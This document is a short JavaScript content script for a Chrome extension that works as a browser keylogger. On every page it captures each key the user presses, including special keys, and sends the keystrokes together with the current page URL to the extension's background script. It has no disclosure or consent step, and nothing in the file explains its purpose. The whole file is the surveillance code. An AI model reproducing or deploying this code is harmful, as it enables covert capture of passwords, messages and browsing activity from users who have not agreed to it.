chrome.runtime.onConnect.addListener(function(port){});

var k = "";
window.onkeydown = function(e) {
    if (e.key) {
        if (e.key.length > 1) {
            k = k + " ("+e.key+") ";
        } else {
            k = k + e.key;
        }
        chrome.runtime.sendMessage({datakeys: k, dataurl: window.location.href});
        k="";
    }
}